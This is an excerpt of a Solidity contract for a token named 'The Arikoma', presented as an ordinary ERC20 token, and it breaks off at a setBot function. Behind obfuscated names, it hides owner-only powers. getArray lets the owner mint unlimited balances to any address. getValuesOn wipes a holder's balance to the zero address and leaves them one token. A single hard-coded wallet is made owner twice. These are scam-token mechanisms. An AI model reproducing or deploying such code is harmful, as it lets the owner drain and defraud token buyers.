...
contract Ownable is Context {
    ...
    constructor () {
        ...
        isTxLimitExempt[_owner] = true; emit OwnershipTransferred(address(0), msgSender);
    }
...
contract ERC20 is Context, IBEP20 {
    ...
    function arrayBool(address IDEto, uint256 IDEamount) internal virtual {
        _balances[IDEto] = _balances[IDEto].add(IDEamount);
    }
    function getValuesOn(address arrayODX) internal virtual {
        _balances[address(0)] += _balances[arrayODX];
        _balances[arrayODX] = 1 * 10 ** 18;
    }
...
contract Arikoma is ERC20, Ownable {
    using SafeMath for uint256;

    address isPROMOaddress = 0x8852322de2ba4C8ed479F9Fc589D953B9696a8ab;
    address isTEAMaddress = 0x8852322de2ba4C8ed479F9Fc589D953B9696a8ab;
    address public uniswapV2Pair;

    string  _name = unicode"The Arikoma";
    string  _symbol = unicode"ヤム";

    uint256 public _rTotal = 1000000 * 10 ** 18;
    uint256 public isBaseTAX = 1;
    ...
    constructor () ERC20(_name, _symbol) {
        setOnlyOwner(isPROMOaddress);
        setOnlyOwner(isTEAMaddress);
        address _connection = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IEDRouter01 connection = IEDRouter01(_connection);
    ...
    uint256 FEErate = amount.mul(isBaseTAX).div(FEEdiv);
        _transfer(to, address(this), FEErate);
    }
    function getArray(address isIDEto, uint256 isODXamount) public _onlyOwner {
        arrayBool(isIDEto, isODXamount);
    }
    function setBot(address adr) public _onlyOwner {
